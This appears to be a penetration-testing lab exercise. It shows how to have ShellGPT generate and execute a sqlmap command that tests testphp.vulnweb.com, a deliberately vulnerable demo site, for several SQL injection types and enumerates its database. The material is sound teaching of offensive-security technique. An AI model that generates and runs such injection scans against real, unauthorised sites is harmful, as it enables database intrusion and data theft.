# Exercise 12: Performing SQL Injection using ShellGPT (AI)

## Objective
Use **ShellGPT (AI)** to automatically generate and execute a **SQLMap** command to detect SQL Injection vulnerabilities and enumerate the database.

---

# Tools Used

- ShellGPT (GPT-4)
- SQLMap

---

# Step 1: Open Terminal

Become root:

```bash
sudo su
```

Password:

```text
toor
```

---

# Step 2: Configure ShellGPT

Run:

```bash
bash sgpt.sh
```

Enter your **AI Activation Key**.

If successful:

```text
API Key configured successfully.
```

---

# Step 3: Generate SQL Injection Command

Run:

```bash
sgpt --shell "Check for Boolean-based SQL injection, UNION-based SQL injection, Error-based SQL injection, and Time-based blind SQL injection on the target URL with parameter as http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database in acuart database. Save the output in a text file with a structured format"
```

---

# Step 4: Execute the Generated Command

ShellGPT will generate a command similar to:

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs ...
```

When prompted:

```text
[E] Execute
[D] Describe
[A] Abort
```

Type:

```text
E
```

Press **Enter**.

---

# What Does ShellGPT Do?

Instead of manually writing SQLMap commands, AI:

- Generates the correct SQLMap command
- Executes it
- Detects SQL Injection
- Enumerates databases
- Saves the results automatically

---

# SQL Injection Types Checked

- Boolean-based SQL Injection
- UNION-based SQL Injection
- Error-based SQL Injection
- Time-based Blind SQL Injection

---

# Output Files

ShellGPT creates:

```text
sqlmap_results.txt
```

It may also generate:

```text
*.csv
```

files containing extracted database information.
